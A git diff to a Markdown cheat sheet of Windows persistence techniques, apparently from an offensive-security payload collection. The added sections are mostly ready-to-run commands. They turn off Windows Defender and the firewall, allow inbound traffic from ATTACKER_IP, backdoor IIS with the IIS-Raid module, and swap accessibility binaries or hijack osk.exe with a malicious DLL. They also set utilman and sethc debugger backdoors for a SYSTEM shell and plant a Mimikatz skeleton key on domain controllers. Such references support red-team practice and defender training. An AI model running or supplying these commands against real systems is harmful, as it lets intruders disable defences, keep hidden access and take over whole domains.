@@ -3,15 +3,26 @@
 ## Summary
 
 * [Tools](#tools)
+* [Disable Windows Defender](#disable-windows-defender)
+* [Disable Windows Firewall](#disable-windows-firewall)
 * [Userland](#userland)
     * [Registry](#registry)
     * [Startup](#startup)
     * [Scheduled Task](#scheduled-task)
+* [Serviceland](#serviceland)
+    * [IIS](#iis)
+    * [Windows Service](#windows-service)
 * [Elevated](#elevated)
     * [HKLM](#hklm)
     * [Services](#services)
     * [Scheduled Task](#scheduled-task)
+    * [Binary Replacement](#binary-replacement)
+        * [Binary Replacement on Windows XP+](#binary-replacement-on-windows-xp)
+        * [Binary Replacement on Windows 10+](#binary-replacement-on-windows-10)
     * [RDP Backdoor](#rdp-backdoor)
+        * [utilman.exe](#utilman.exe)
+        * [sethc.exe](#sethc.exe)
+    * [Skeleton Key](#skeleton-key)
 * [References](#references)
 
 
@@ -19,7 +30,31 @@
 
 - [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)
 
+## Disable Windows Defender
+
+```powershell
+sc config WinDefend start= disabled
+sc stop WinDefend
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+## Disable Windows Firewall
+
+```powershell
+Netsh Advfirewall show allprofiles
+NetSh Advfirewall set allprofiles state off
+
+# ip whitelisting
+New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+```
+
 ## Userland
+
+Set a file as hidden
+
+```powershell
+attrib +h c:\autoexec.bat
+```
 
 ### Registry
 
@@ -75,7 +110,19 @@ SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Som
 SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
 ```
 
-## Windows Service
+## Serviceland
+
+### IIS
+
+IIS Raid – Backdooring IIS Using Native Modules
+
+```powershell
+$ git clone https://github.com/0x09AL/IIS-Raid
+$ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
+C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
+```
+
+### Windows Service
 
 Using SharPersist
 
@@ -115,6 +162,27 @@ PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
 PS C:\> Register-ScheduledTask Backdoor -InputObject $D
 ```
 
+### Binary Replacement
+
+#### Binary Replacement on Windows XP+
+
+| Feature             | Executable                            |
+|---------------------|---------------------------------------|
+| Sticky Keys         | C:\Windows\System32\sethc.exe         |
+| Accessibility Menu  | C:\Windows\System32\utilman.exe       |
+| On-Screen Keyboard  | C:\Windows\System32\osk.exe           |
+| Magnifier           | C:\Windows\System32\Magnify.exe       |
+| Narrator            | C:\Windows\System32\Narrator.exe      |
+| Display Switcher    | C:\Windows\System32\DisplaySwitch.exe |
+| App Switcher        | C:\Windows\System32\AtBroker.exe      |
+
+#### Binary Replacement on Windows 10+
+
+Exploit a DLL hijacking vulnerability in the On-Screen Keyboard **osk.exe** executable.
+
+Create a malicious **HID.dll** in  `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
+
+
 ### RDP Backdoor
 
 #### utilman.exe
@@ -122,7 +190,7 @@ PS C:\> Register-ScheduledTask Backdoor -InputObject $D
 At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.
 
 ```powershell
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
 
 #### sethc.exe
@@ -130,12 +198,23 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 Hit F5 a bunch of times when you are at the RDP login screen.
 
 ```powershell
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
 
+### Skeleton Key
+
+```powershell
+# Exploitation Command runned as DA:
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>
+
+# Access using the password "mimikatz"
+Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
+```
 
 ## References
 
 * [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
 * [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
 * [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
+* [IIS Raid – Backdooring IIS Using Native Modules - 19/02/2020](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)
+* [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)
